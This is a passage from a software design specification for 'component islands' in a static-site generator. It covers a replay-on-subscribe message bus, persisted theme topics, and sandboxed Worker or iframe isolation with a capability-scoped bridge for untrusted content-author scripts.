---
id: SPEC-050
title: "Component Islands & Inter-Island Messaging"
status: implemented
version: 0.16.0
last-updated: 2026-06-26
audience: agent, human
---

# SPEC-050: Component Islands & Inter-Island Messaging

## Orientation

**Intent:** Let a [[SPEC-048]] component ship optional client-side behaviour (a JS
**island**) that progressively enhances its static HTML, and let independent islands
coordinate at runtime through a single shell-provided message bus — without a framework
runtime, without islands importing each other, and without breaking `file://` or
JS-disabled rendering.

**Metaphor:** *a noticeboard and a tannoy.* The retained `store` is a noticeboard — it
keeps the latest note pinned, so an island that arrives late still reads the current
value (replay-on-subscribe). The ephemeral `bus` is a tannoy announcement — heard only
by whoever is already in the room; miss it and it's gone. Islands never talk to each
other directly; they pin to and read from named channels.

**Structure** (`≤ 7` boxes; arrows = runtime message flow):

```
            ┌──────────────── SPA shell (SPEC-028), survives nav ───────────────┐
            │  window.zetl = { store(topic), bus }   — TYPED payloads (REQ-5013) │
            │   ├─ retained store: last-value + replay-on-subscribe              │
            │   └─ ephemeral bus: fire-and-forget                                │
            │                       ▲  capability bridge (reference monitor)     │
            └──────▲────────────────┼──────────── grant table + type check ──────┘
   in realm (trusted)               │ postMessage — Worker handle (default) │ port (iframe)
  ┌──────────────────┐     ┌────────┴──────────────────────────────────────┐
  │ trusted island   │     │ content island — NO window.zetl (REQ-5010):    │
  │ direct window.   │     │  • DEFAULT: Worker → host-painted element tree │
  │ zetl (REQ-5010)  │     │    (REQ-5025, Remote DOM) — closes Threat M    │
  └──────────────────┘     │  • escape hatch: sandboxed iframe (REQ-5015)   │
                           └────────────────────────────────────────────────┘
  build: emit <name>.js once/type (REQ-5001) · manifest topics+types+grants → wiring
  graph (REQ-5008/CON-5002) · persisted topics → localStorage + storage event (REQ-5006)
```

**Decisions** (deliberate before implementing):
[[SPEC-050-component-islands-and-messaging#ADR-5001]] shell bus, not a shared store module ·
[[SPEC-050-component-islands-and-messaging#ADR-5002]] replay-on-subscribe is the default primitive ·
[[SPEC-050-component-islands-and-messaging#ADR-5010]] content islands default to a Worker + host-rendered controlled-element model (Remote DOM); iframe sandbox is the opt-in escape hatch (supersedes ADR-5003) ·
[[SPEC-050-component-islands-and-messaging#ADR-5007]] topics are typed; payloads recognised at the bus boundary ·
[[SPEC-050-component-islands-and-messaging#ADR-5008]] the bridge is a capability (island handle + parent reference monitor) ·
[[SPEC-050-component-islands-and-messaging#ADR-5005]] persisted topics carry a declared default + inline pre-paint set (FOUC).

**Load-bearing requirements:**
[[SPEC-050-component-islands-and-messaging#REQ-5001]] gated per-type island emission ·
[[SPEC-050-component-islands-and-messaging#REQ-5004]] shell bus (`store` + `bus`) ·
[[SPEC-050-component-islands-and-messaging#REQ-5005]] replay-on-subscribe ·
[[SPEC-050-component-islands-and-messaging#REQ-5010]] two trust tiers (in-realm vs isolated, two render modes) ·
[[SPEC-050-component-islands-and-messaging#REQ-5013]] typed payloads ·
[[SPEC-050-component-islands-and-messaging#REQ-5025]] controlled-element content islands (Worker, default) ·
[[SPEC-050-component-islands-and-messaging#REQ-5015]] content-island iframe sandbox (escape hatch) ·
[[SPEC-050-component-islands-and-messaging#REQ-5016]] capability-scoped bridge (transport-agnostic reference monitor) ·
[[SPEC-050-component-islands-and-messaging#REQ-5017]] island lifecycle under SPA nav ·
[[SPEC-050-component-islands-and-messaging#REQ-5012]] backward-compatible default.

**Remaining open** (non-blocking now that a reference implementation exists — see
[[SPEC-050-component-islands-and-messaging#12. Open Questions]]):
Q4 bus/bridge residence in the SPEC-028 shell · Q7 exact trusted-island topic declaration ·
Q9 mode-aware consolidation follow-through · Q10 same-origin Worker storage not CSP-gated.
*(Q1 FOUC, Q2 sandbox/worker, Q3 typed-payloads, Q5 ordering/delivery, Q6 iframe cost,
Q8 controlled-element, Q11 patch protocol [v1 = full-tree re-send] — resolved/implemented.)*

**Detail:** the full requirement, contract, and test nodes follow below.

> **Conformance.** The key words MUST, MUST NOT, REQUIRED, SHALL, SHALL NOT, SHOULD,
> SHOULD NOT, RECOMMENDED, MAY, and OPTIONAL in this document are to be interpreted as
> described in BCP 14 (RFC 2119, RFC 8174) when, and only when, they appear in all
> capitals ([[PROTO-001#Requirement-Level Keywords (BCP 14)]]).

> **Implementation status — implemented, island boundary not yet declared converged.** A
> **reference implementation** (PR #65, behind `component-islands`) now exists: gated/dedup/
> deterministic emission, the `window.zetl` retained bus, the capability-scoped bridge
> reference monitor, the CON-5007 controlled-element renderer, per-page CSP, persisted
> topics + pre-paint, and the wiring verifier — with byte-identical defaults (REQ-5012) and
> LangSec + node-runtime tests. It then passed **five post-implementation review rounds**
> (2 fresh-context adversarial + 3 Codex); **every round found a genuine boundary bug** at the
> untrusted-island trust boundary (egress via `mailto:` / obfuscated scheme / protocol-relative
> slash-mix; an ungranted trusted-topic subscribe; an unsubscribe that leaked its store
> subscription; publisher/subscriber type-conflict) — each fixed with a regression test. The
> recurrence is the signal: the boundary is hardened but **not exhausted**. Per [[PROTO-001]]
> Principle 11 ([[Anti-Slop Bias]]), production reliance on a content (untrusted) island still
> REQUIRES a dedicated human security expert + sustained executable fuzzing before the boundary
> is treated as converged. `[Blocked: Qn]` / `[Provisional]` markers below predate the impl.

## Information Table

| Field        | Value                                                                                  |
| ------------ | -------------------------------------------------------------------------------------- |
| Document ID  | [[SPEC-050-component-islands-and-messaging\|SPEC-050]]                                  |
| Title        | Component Islands & Inter-Island Messaging                                              |
| Version      | 0.16.0                                                                                  |
| Status       | Implemented (reference impl, PR #65, behind `component-islands`; untrusted island boundary NOT declared converged — pending dedicated human security review + executable fuzzing) |
| Author       | Agent (Claude Opus 4.8 [1M], [[PROTO-001\|USDD Agent Protocol]] v1.11.0)                |
| Date         | 2026-06-26                                                                              |
| Predecessor  | [[SPEC-048-components-and-static-overrides\|SPEC-048]] (islands/bus deferred here)      |
| Related      | [[SPEC-028]] SPA shell, [[SPEC-049]] content-author components, [[SPEC-002]] search     |
| Feature Gate | `component-islands` (island emission + hydration); `island-bus` (shell messaging)       |
| Review tier  | Tier 2 (trust boundary: untrusted content-island JS in a sandbox + capability bridge; `localStorage`/cross-tab + inbound `postMessage` as untrusted input) |

---

## 1. Overview

### 1.1 Problem

[[SPEC-048]] components render to static HTML + (unscoped) CSS, which is correct for the
dominant case and works on `file://` with JS off. But some components are inherently
interactive — a theme toggle, a copy-to-clipboard button, a collapsible, a live filter —
and a few of those must **coordinate**: a theme toggle in the nav-header must tell every
themed surface to switch; a search-open button must tell the search island to mount.

Two capabilities are therefore missing from the v1 core, and SPEC-048 deferred both here:

1. **No client-side island.** A component cannot ship behaviour. There is no convention
   for emitting a component's `<name>.js`, hydrating its instances, gating the script so
   pages that don't use it stay JS-free, or composing with the [[SPEC-028]] SPA shell's
   client-side navigation.

2. **No inter-island coordination.** Even with islands, two independent islands have no
   sanctioned way to communicate. The naïve answers all fail: a bare `CustomEvent` bus
   silently loses any signal fired before a subscriber mounted (the dominant islands bug,
   and fatal for state like the current theme); a shared imported store couples islands
   into a bundle and fights the "emit each island once" model; ad-hoc `window` globals
   have no contract, no audit, and collide.

### 1.2 Core Insight

**The hard part is not messaging — it is *late* subscribers.** Under the SPEC-028 SPA
shell, page subtrees are swapped on navigation, so islands mount, unmount, and re-mount
*after* values have already been published. Any coordination primitive whose correctness
depends on "both parties present at the moment of the signal" is wrong here. The load-
bearing primitive is therefore a **retained, replay-on-subscribe store** living on the
*persistent* shell (which survives navigation), with an ephemeral fire-and-forget `bus`
as the secondary primitive for genuinely momentary events
([[SPEC-050-component-islands-and-messaging#ADR-5002]]).

The second insight is a trust one: **a JS island is arbitrary code, and code-in-the-realm
has ambient authority.** A *trusted* theme island already controls the page, so it runs
in-realm with direct `window.zetl`. A *content-author* island ([[SPEC-049]]) is untrusted,
and string-namespacing topics cannot isolate untrusted same-realm JS from a topic like
`theme`. The boundary must therefore be a **real one**: content islands run in an isolated
realm — a **Worker** (default, no DOM/`window.zetl`) or a sandboxed iframe (escape hatch,
opaque origin) — and reach the bus only through a **capability-scoped bridge** the parent
reference-monitors, over **typed** messages. Isolation (REQ-5025/5015) + capability scoping
(REQ-5016) + payload/render recognition (REQ-5013/CON-5007) + worker confinement (REQ-5026)
are the legs that let untrusted authors add interactivity without forging a trusted topic, or
(in the default mode) emitting HTML or exfiltrating a granted read
([[SPEC-050-component-islands-and-messaging#ADR-5010]]).

**Where this sits relative to prior art.** The *trusted* half is well-trodden: static-first
islands, partial hydration, per-island hydration timing (`client:*` → REQ-5024), and
replay-on-subscribe state (Astro's [[Nano Stores]] → REQ-5005/ADR-5002) all mirror
[[Astro Islands]]. Critically, the *untrusted content-island* half is **also an established
pattern** — "run untrusted third-party code in a sandbox and let it drive a controlled UI /
exchange capability-scoped messages with a trusted host" has multiple production
implementations: **[[Shopify Remote DOM]]** (untrusted code in a sandboxed JS environment
renders a *controlled set of UI elements* to the host page — the closest structural twin,
used for third-party app/checkout extensions); **[[SES]]/[[Endo]]** object-capability
confinement + [[CapTP]] capability-transport messaging (the [[Google Caja]] lineage; powers
[[MetaMask Snaps]]); **[[amp-script]]/[[worker-dom]]** (untrusted author JS in a Web Worker
with a sanitized DOM bridge — the worker variant of Q2); and **[[Penpal]]/[[Comlink]]** for
the promise-RPC-over-`postMessage` plumbing. So the **sandbox + capability-bridge mechanism is
not novel**; what is new here is only the *application* — markdown-authored components in a
**static-site generator**. The four adversarial passes hardened the *specification* of
adapting that pattern (the `null`-origin/port-identity, lifecycle, and value-flow details);
they did not have to invent the pattern, and IMPL-050 SHOULD study these systems (especially
Remote DOM's controlled-element model — see Q8) rather than re-derive.

### 1.3 Design Principles

1. **Progressive enhancement, always.** Every island enhances HTML that already works
   without it; JS-disabled and `file://` render the static component unchanged
   ([[SPEC-050-component-islands-and-messaging#REQ-5002]]).
2. **No framework runtime.** An island is a plain ES module; the build emits it once per
   component type per page and hydrates `data-z` nodes — no shared bundle, no VDOM
   ([[SPEC-050-component-islands-and-messaging#ADR-5004]]).
3. **Coordinate by topic, never by reference.** Islands publish/subscribe named topics;
   neither references the other ([[SPEC-050-component-islands-and-messaging#ADR-5001]]).
4. **Retain by default; the latecomer is the norm.** The default primitive replays the
   current value on subscribe ([[SPEC-050-component-islands-and-messaging#ADR-5002]]).
5. **Trust by isolation, not by exclusion.** Trusted theme islands run in-realm; untrusted
   content-author islands run in an isolated realm — a Worker (default) or a sandboxed iframe
   (escape hatch) — reaching the bus through a capability-scoped bridge over typed messages;
   arbitrary realm access is trusted-author only ([[SPEC-050-component-islands-and-messaging#REQ-5010]],
   [[SPEC-050-component-islands-and-messaging#REQ-5025]],
   [[SPEC-050-component-islands-and-messaging#REQ-5016]]).
6. **Recognise before acting ([[LangSec]]).** Topic names, manifest declarations, and —
   critically — values read back from `localStorage`/`storage` events are recognised
   against a declared grammar before use
   ([[SPEC-050-component-islands-and-messaging#CON-5001]]–[[SPEC-050-component-islands-and-messaging#CON-5004]]).
7. **No behaviour without invocation.** A vault using no island behaves byte-identically
   to a [[SPEC-048]]-only build ([[SPEC-050-component-islands-and-messaging#REQ-5012]]).

### 1.4 Scope

**In scope:** optional component islands (`<name>.js`) with gated, deduped, deterministic
emission ([[SPEC-050-component-islands-and-messaging#REQ-5001]]); progressive enhancement
([[SPEC-050-component-islands-and-messaging#REQ-5002]]); SPA-shell hydration/re-hydration
([[SPEC-050-component-islands-and-messaging#REQ-5003]]); the shell-provided message bus —
retained `store` + ephemeral `bus` ([[SPEC-050-component-islands-and-messaging#REQ-5004]],
[[SPEC-050-component-islands-and-messaging#REQ-5005]]); persisted topics
([[SPEC-050-component-islands-and-messaging#REQ-5006]]); bus survival across navigation
([[SPEC-050-component-islands-and-messaging#REQ-5007]]); manifest-declared topics + static
wiring verification ([[SPEC-050-component-islands-and-messaging#REQ-5008]]); the audit
wiring graph ([[SPEC-050-component-islands-and-messaging#REQ-5009]]); the two-tier island
trust boundary ([[SPEC-050-component-islands-and-messaging#REQ-5010]]); topic grammar
([[SPEC-050-component-islands-and-messaging#REQ-5011]]); backward-compatible default
([[SPEC-050-component-islands-and-messaging#REQ-5012]]); **typed topic payloads**
([[SPEC-050-component-islands-and-messaging#REQ-5013]]); the **content-island iframe
sandbox** ([[SPEC-050-component-islands-and-messaging#REQ-5015]]); and the
**capability-scoped bridge** ([[SPEC-050-component-islands-and-messaging#REQ-5016]]).

**Out of scope:** a reactive/VDOM framework; server-pushed islands or websockets (the bus
is client-local); nested/recursive *topic value* schemas beyond the v1 flat-record type
language (CON-5005 — note the `render` *element tree* is recursive and has its own bounded
recogniser, CON-5007); cross-document (cross-origin) messaging beyond the local capability
bridge. *(The Worker-based content-island variant is no longer out of scope — it is the
default render mode, REQ-5025.)*

---

## 2. User Profiles

> **`[Provisional — refined by Phase 1 synthetic-user runs.]`**

### 2.1 The Theme Author
Ships an interactive component (theme toggle, copy button, collapsible) and wants it to
enhance the static markup, hydrate reliably under SPA navigation, and — for the toggle —
broadcast a `theme` change every surface picks up.

### 2.2 The Site Operator
Wants interactive chrome to "just work" on the deployed static site and on `file://`,
with no flash of the wrong theme on load, and with a build that stays JS-free on pages
that use no island.

### 2.3 The Reviewer / Auditor
Wants to confirm at build time that every `subscribes` topic has a publisher, that no
magic-string typo silently breaks wiring, that a content-authored page cannot reach the
trusted bus, and that values restored from `localStorage` cannot inject.

---

## 3. Happy Paths

> **`[Provisional — refined by Phase 1.]`**

### 3.1 HP1: Default — No Islands, Nothing Changes
**Pre:** no component ships `<name>.js`. **Post:** byte-identical to a SPEC-048-only
build; no `window.zetl`, no bus, no island scripts
([[SPEC-050-component-islands-and-messaging#REQ-5012]]).

### 3.2 HP2: A Self-Contained Island (Copy Button)
A `copy-button` component ships `copy-button.js`. The build emits it once as a
`<script type="module">` on pages that use the component; it hydrates each
`data-z="copy-button"` node. With JS off, the button still renders (and is inert)
([[SPEC-050-component-islands-and-messaging#REQ-5001]],
[[SPEC-050-component-islands-and-messaging#REQ-5002]]).

### 3.3 HP3: Theme Toggle Coordinates Every Surface
`theme-toggle.js` declares `publishes = ["theme"]`; other islands declare
`subscribes = ["theme"]`. Clicking the toggle calls `store("theme").set("dark")`. Every
subscriber — including one that mounts after the click, and one re-mounted after a
client-side SPA navigation — reads `"dark"` (replay-on-subscribe; the bus survives nav).
`theme` is `persisted`, so it round-trips `localStorage` and reflects a cross-tab
`storage` event ([[SPEC-050-component-islands-and-messaging#REQ-5005]],
[[SPEC-050-component-islands-and-messaging#REQ-5006]],
[[SPEC-050-component-islands-and-messaging#REQ-5007]]).

### 3.4 HP4: A Typo Is Caught at Build Time
An island declares `subscribes = ["theme"]` but no component publishes `theme`. The build
emits `island-topic-unpublished` (warning) and the wiring graph shows the dangling edge
([[SPEC-050-component-islands-and-messaging#REQ-5008]],
[[SPEC-050-component-islands-and-messaging#REQ-5009]]).

### 3.5 HP5: A Content Island Is Sandboxed and Capability-Scoped
A [[SPEC-049]] content component ships a `content:filter` island. The build mounts it in a
sandboxed iframe (opaque origin — no `window.zetl`); its only authority is a transferred
port whose grant table allows `publish content:filter` and (because the theme declared the
grant) `subscribe theme` read-only. It reads `theme` to style itself and publishes
`content:filter`; an attempt to publish `theme` is dropped at the bridge
(`island-capability-denied`) — a markdown author can never forge or overwrite a trusted
topic ([[SPEC-050-component-islands-and-messaging#REQ-5010]],
[[SPEC-050-component-islands-and-messaging#REQ-5015]],
[[SPEC-050-component-islands-and-messaging#REQ-5016]],
[[SPEC-050-component-islands-and-messaging#Threat A]]).

### 3.6 HP6: No Flash of the Wrong Theme
On first paint, the persisted `theme` value is applied by a tiny inline pre-paint script
before hydration, so a returning visitor never sees a light→dark flash
([[SPEC-050-component-islands-and-messaging#REQ-5006]],
[[SPEC-050-component-islands-and-messaging#ADR-5005]]).

---

## 4. Functional Requirements

> Numbering: SPEC-050 → REQ-50xx, sequential. Each REQ decomposes into positive /
> negative-input / negative-output tests ([[PROTO-001]] §9).

### REQ-5001: Gated, Deduplicated, Deterministic Island Emission
WHEN a [[SPEC-048]] component ships `<name>.js`, the build SHALL emit it **once per
component type used on a page** as a `<script type="module">` reference, and SHALL gate
emission so a page using no JS-bearing component loads **no** island script. The emitted
set and order SHALL be byte-identical across repeated builds (declared total order:
component name, then source layer), reusing the [[SPEC-048]] REQ-4809 dedup/emission
model. The script SHALL hydrate nodes carrying the component's `data-z="<name>"` marker.

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5001]], [[SPEC-050-component-islands-and-messaging#NFR-5002]].

### REQ-5002: Progressive Enhancement
A component's static HTML + CSS SHALL render correctly with JavaScript disabled and under
`file://`; the island SHALL only **enhance** already-meaningful markup, never be the sole
source of content or navigation. An island SHALL NOT inject content that is required for
the page to be usable or indexable ([[SPEC-002]]); content an island reveals SHALL have a
no-JS-accessible fallback.

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5002]], [[SPEC-028]]; [[SPEC-050-component-islands-and-messaging#3.2 HP2]].

### REQ-5003: SPA-Shell Hydration and Re-Hydration
WHEN the [[SPEC-028]] SPA shell is enabled (`[spa].enabled`), islands SHALL re-hydrate
after a client-side navigation swaps the page subtree; when the shell is off, islands
SHALL hydrate once on initial load. Hydration SHALL be **idempotent** — an already-
hydrated node SHALL NOT be double-bound — and SHALL bind only nodes within the freshly
swapped subtree on re-hydration, not the whole document.

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5003]], [[SPEC-028]].

### REQ-5024: Per-Island Hydration Strategy
An island MAY declare a **hydration strategy** in its manifest
([[SPEC-050-component-islands-and-messaging#CON-5002]]) controlling *when* it hydrates —
modelled on Astro's `client:*` directives (prior art, [[Astro Islands]]) so the pattern is
familiar and proven:
- `load` (default) — hydrate on initial load / immediately after the swapped subtree mounts.
- `idle` — hydrate at the next browser idle period (`requestIdleCallback`, fallback timeout).
- `visible[(<rootMargin>)]` — hydrate when the island's root enters the viewport
  (`IntersectionObserver`); for a **content island**, the runtime — the **Worker** (default
  mode) or the iframe + capability bootstrap (escape hatch,
  [[SPEC-050-component-islands-and-messaging#REQ-5016]]) — SHALL be created lazily at this
  point, not at page load, so off-screen content islands cost nothing until scrolled to.
- `media(<query>)` — hydrate when a CSS media query matches (e.g. only above a breakpoint).

The strategy SHALL be **purely a timing optimisation over progressive enhancement**: the
static component HTML ([[SPEC-050-component-islands-and-messaging#REQ-5002]]) is fully usable
before (and without) hydration regardless of strategy, and `visible`/`media`/`idle` SHALL
never withhold content required for the page to be usable or indexable. Strategy selection
SHALL NOT change the once-per-type emission (REQ-5001) or the bus/bridge semantics — only the
hydration trigger.

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5024]], [[SPEC-050-component-islands-and-messaging#REQ-5002]], [[SPEC-050-component-islands-and-messaging#NFR-5001]], [[SPEC-050-component-islands-and-messaging#ADR-5009]].

### REQ-5004: Shell-Provided Message Bus
The SPA shell SHALL expose exactly two coordination primitives on a stable global
`window.zetl`: a retained **`store(topic)`** and an ephemeral **`bus`**
([[SPEC-050-component-islands-and-messaging#CON-5003]]). Islands SHALL communicate
**only** through these — never by one island importing another, and never via a shared
reactive-store compile unit ([[SPEC-050-component-islands-and-messaging#ADR-5001]]). The bus
runtime is **emitted** for a page **iff that page emits ≥ 1 island**; this is a statement
about **build-time page assets** (REQ-5012). The *runtime presence* of `window.zetl` under
the session-persistent SPA shell is governed by
[[SPEC-050-component-islands-and-messaging#REQ-5023]] (a page that loads no island does not
itself create the bus, but `window.zetl` may already exist from an earlier island page in the
same session).

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5004]], [[SPEC-050-component-islands-and-messaging#REQ-5023]], [[SPEC-050-component-islands-and-messaging#CON-5003]], [[SPEC-050-component-islands-and-messaging#ADR-5001]].

### REQ-5005: Retained Store With Replay-on-Subscribe
`store(topic)` SHALL be last-value-wins state with **replay on subscribe**: a subscriber
SHALL receive the topic's current value immediately on subscription AND on every
subsequent change. An island that mounts (or re-mounts after a navigation) **after** a
value was published SHALL still observe the current value, not miss it. `set(value)` with
an unchanged value MAY be coalesced (no spurious notification); **"unchanged" is defined as
post-normalisation structural equality** (records compared by field values, `-0`≡`0`,
`NaN` not applicable — values are finite per CON-5005), so coalescing and the REQ-5021
value-change relay are deterministic across implementations rather than object-identity
dependent. Notification ordering SHALL be deterministic (subscription order), and the
synchronous fan-out SHALL **isolate per-subscriber faults** — each subscriber callback runs
in its own `try/catch` so one throwing or slow callback cannot wedge delivery to the others
(restating CON-5003's "never a throw that breaks unrelated islands" for the ordered loop;
mitigates a trusted-island DoS, [[SPEC-050-component-islands-and-messaging#Threat L]]).

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5005]], [[SPEC-050-component-islands-and-messaging#CON-5003]]; [[SPEC-050-component-islands-and-messaging#3.3 HP3]].

### REQ-5006: Persisted Topics
A topic MAY be declared **persisted**, backed by `localStorage` with a required **default
value** applied when storage is empty. Two distinct mechanisms, by page kind:
- **First paint, every page with the topic:** the inline pre-paint script
  ([[SPEC-050-component-islands-and-messaging#REQ-5018]]) reads `localStorage` at load and
  applies the recognised value (or default) before paint — this runs whether or not the page
  has an island.
- **Live cross-tab reflection, whenever the bus is live:** WHEN the bus runtime is present,
  the shell SHALL subscribe to the `storage` event and reflect cross-tab changes into the
  retained store mid-session. Under SPA navigation the bus is session-persistent
  ([[SPEC-050-component-islands-and-messaging#REQ-5023]]), so live reflection is available for
  any persisted topic in a session that has loaded ≥ 1 island page; a session that has loaded
  **only** no-island pages has just the per-page pre-paint apply (load-time), with no
  mid-session reflection — an explicit, documented limitation of the no-bus path.

Values read from `localStorage` or a `storage` event are **untrusted input** and SHALL be
recognised against the topic's declared type before being applied
([[SPEC-050-component-islands-and-messaging#CON-5004]], [[SPEC-050-component-islands-and-messaging#Threat C]]);
a value failing recognition SHALL be discarded for the declared default, never applied raw.

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5006]], [[SPEC-050-component-islands-and-messaging#CON-5004]], [[SPEC-050-component-islands-and-messaging#ADR-5005]]; [[SPEC-050-component-islands-and-messaging#Threat C]], [[SPEC-050-component-islands-and-messaging#Threat F]].

### REQ-5007: Single Bus Instance Surviving Navigation
The bus SHALL be a **single instance that lives on the persistent SPA shell**, not inside
any swapped page subtree, so retained values and subscriptions survive a client-side
navigation. A re-hydrated island re-subscribing to a topic SHALL receive the retained
value (REQ-5005), not a reset.

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5007]], [[SPEC-028]].

### REQ-5008: Manifest-Declared Topics and Static Wiring Verification
A [[Component Manifest]] for an island-bearing component MAY declare `publishes` and
`subscribes` — arrays of topic names matching the topic grammar
([[SPEC-050-component-islands-and-messaging#REQ-5011]]). The build SHALL statically
verify wiring: a `subscribes` topic with **no** declared publisher in the resolved
component set SHALL be `island-topic-unpublished` (warning); a malformed topic name SHALL
be `island-topic-malformed` (error).

**Enforceability differs by tier, and the spec is honest about it:**
- For a **content island**, the manifest `publishes`/`subscribes` (+ `[[theme.island-grants]]`)
  are the **exact, enforced** capability contract — the bridge grant table is built from them
  and rejects anything else at runtime (REQ-5016). Here `island-capability-ungranted` (a
  content island subscribing a trusted topic with no grant), `island-content-unsandboxed`
  (publishing a non-`content:` topic, or — **in `render = "iframe"` mode only** — missing
  `sandbox = true`), and `island-content-value-type` are hard **build errors**
  ([[SPEC-050-component-islands-and-messaging#CON-5002]]).
- For a **trusted in-realm island**, the runtime API is bare `window.zetl.store(topic)` /
  `bus.emit(topic, …)` with **no island identity and no generated per-island capability**, so
  the build *cannot* soundly prove which trusted island touches which topic. Therefore
  `island-topic-undeclared` for a trusted island is an explicitly **best-effort, AST-based
  lint** (warning) with a **defined recognised form**: a `CallExpression` whose callee is a
  `MemberExpression` `.store`/`.emit` on an identifier statically bound to the bus, with a
  **single string-literal first argument** — that literal topic is checked against the
  manifest. The lint performs **no data-flow analysis**, so its bounded failure classes are
  stated: a computed/concatenated/template topic (`store(t)`, `store("a"+b)`,
  `` store(`x`) ``) is a **false negative** (uncheckable, out of scope), and a `.store(`/`.emit(`
  on an unrelated object aliasing the name is a possible **false positive** (suppressed by the
  binding check). It is a **lint, never a gate** for trusted islands. v1 does not mandate a
  wrapper or metadata export to make this exact (deferred — `[Blocked: Q7]`).

These manifest declarations are *wiring/audit* metadata for trusted islands and the
*enforced capability set* for content islands; the runtime trust boundary itself is enforced
by REQ-5010/5015/5016, not by the declaration. The keys `publishes`/`subscribes`,
reserved-and-rejected in [[SPEC-048]] CON-4801, are accepted under this spec's feature gate.

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5008]], [[SPEC-050-component-islands-and-messaging#CON-5002]]; [[SPEC-050-component-islands-and-messaging#3.4 HP4]].

### REQ-5009: Island Wiring Graph (Audit)
Per build, the system SHALL emit an **island wiring graph**: for each island component,
its declared `publishes`/`subscribes` topics and the resolved publisher→subscriber edges,
plus any `island-topic-unpublished`/`island-topic-undeclared` findings, so runtime
coordination is auditable at build time. For each page it SHALL also record the **effective
egress CSP** ([[SPEC-050-component-islands-and-messaging#REQ-5027]]) — the computed policy and,
per directive, which `[security.csp]`/theme declaration widened it beyond the default-deny
baseline — and each content island's render mode, `paints` grant, and **`[island.requests]`
entries with their `approved`/`unapproved` status + `reason`**
([[SPEC-050-component-islands-and-messaging#REQ-5028]]), so a reviewer can diff exactly what each
island *asked for*, what was *approved*, and what network egress and rendering authority each
page actually permits. This extends [[SPEC-048]] OBS-4801.

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5008]], [[SPEC-050-component-islands-and-messaging#TEST-5027]], [[SPEC-050-component-islands-and-messaging#OBS-5001]].

### REQ-5010: Two Island Trust Tiers — Trusted In-Realm, Content Sandboxed
There SHALL be two island trust tiers, distinguished by author trust:

- **Trusted islands** (theme/component authors) run **in the page realm** with direct
  access to `window.zetl` ([[SPEC-050-component-islands-and-messaging#REQ-5004]]), as
  they ship code that already controls the page.
- **Content-author islands** ([[SPEC-049]]) run in an isolated realm with **no access to the
  parent realm, the parent DOM, or `window.zetl`**, reaching the bus only through the
  capability-scoped bridge ([[SPEC-050-component-islands-and-messaging#REQ-5016]]). There are
  **two render modes**, and (drawing on production prior art) the **Worker mode is the
  default** ([[SPEC-050-component-islands-and-messaging#ADR-5010]]):
  - **Controlled-element mode (DEFAULT, [[SPEC-050-component-islands-and-messaging#REQ-5025]]):**
    the island runs in a **Web Worker** (no DOM, no `window.zetl`; note it **does** retain
    ambient network + same-origin storage — IndexedDB/Cache — confined per
    [[SPEC-050-component-islands-and-messaging#REQ-5026]], *not* absent) and emits a
    **host-approved declarative element tree** that the trusted host paints into the page —
    the [[Shopify Remote DOM]] / [[worker-dom]] model. Untrusted code never produces HTML, so
    [[SPEC-050-component-islands-and-messaging#Threat M]] is closed *by construction*; the
    widget renders inline with page CSS; and identity is trivial (the parent holds the `Worker`
    object).
  - **Full-DOM mode (opt-in escape hatch, [[SPEC-050-component-islands-and-messaging#REQ-5015]]):**
    for an island that genuinely needs arbitrary DOM / a DOM-manipulating library, a sandboxed
    `<iframe>` (opaque origin, no `allow-same-origin`) with the capability bridge of
    REQ-5016/CON-5006. This is the heavier, `null`-origin path that REQ-5022's producer
    restriction guards.
  A content island (either mode) SHALL NOT obtain a publish capability for a trusted topic; it
  MAY be granted a **read-only** subscribe capability for one only when the theme explicitly
  declares the grant.

  **Worker storage policy (residual).** A Worker retains same-origin **IndexedDB/Cache/storage**,
  which CSP does **not** gate. This is *local* (does not by itself leave the device), so v1
  accepts it, but records the residual honestly: a read-granted island could persist a subscribed
  value locally, forming a **staged covert channel** if another same-origin context later reads it
  and has egress. v1 does not partition per-island storage (the platform offers no per-Worker
  storage scope); the egress-taint rule (REQ-5026/CON-5007) limits the *exit*, and operators who
  need more SHOULD isolate untrusted content on a separate origin. Tracked as `[Blocked: Q10]`.

This is the enforcement boundary the v0.1.0 strawman lacked: **realm isolation** (a Worker or
an opaque-origin iframe, not topic-string namespacing) is what prevents a markdown author from
reading, forging, or overwriting a trusted topic such as `theme`
([[SPEC-050-component-islands-and-messaging#ADR-5003]],
[[SPEC-050-component-islands-and-messaging#Threat A]]).

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5010]], [[SPEC-050-component-islands-and-messaging#REQ-5015]], [[SPEC-050-component-islands-and-messaging#REQ-5016]], [[SPEC-049]]; [[SPEC-050-component-islands-and-messaging#Threat A]]; [[SPEC-050-component-islands-and-messaging#3.5 HP5]].

### REQ-5011: Topic Grammar and Trust-Domain Namespace
A topic name SHALL match a declared grammar
([[SPEC-050-component-islands-and-messaging#CON-5001]]): a lowercase, colon-namespaced
identifier (e.g. `theme`, `search:open`). A **reserved `content:` namespace prefix** SHALL
partition the trust domains: a content-author island MAY publish only `content:`-prefixed
topics; trusted topics (no `content:` prefix) are publishable only by trusted in-realm
islands. The namespace is a wiring/clarity aid layered on top of — never a substitute for —
the realm isolation and capability grants of
[[SPEC-050-component-islands-and-messaging#REQ-5010]]. A malformed topic at a declaration
or call site SHALL fail closed (`island-topic-malformed`).

**Trace:** [[SPEC-050-component-islands-and-messaging#TEST-5011]], [[SPEC-050-component-islands-and-messaging#CON-5001]].

### REQ-5012: Backward-Compatible Default (Build-Time Page Assets)
The **emitted assets** of a page are a clean two-marker gate (this REQ is about build output;
runtime presence under SPA nav is REQ-5023):
- **No island AND no persisted topic** → output is **byte-identical** to a [[SPEC-048]]-only
  build: no bus/island/iframe/pre-paint script.
- **≥ 1 island** → island assets + the bus/bridge runtime bootstrap are emitted (plus the
  pre-paint script if any persisted topic).
- **persisted topic but no island** → **only** the inline pre-paint script is emitted; no bus
  runtime asset.

The shell gates the bus bootstrap on a build-set "has-island" marker; the pre-paint script on
a separate "has-persisted-topic" marker (independent). Adding SPEC-050 to a vault does not
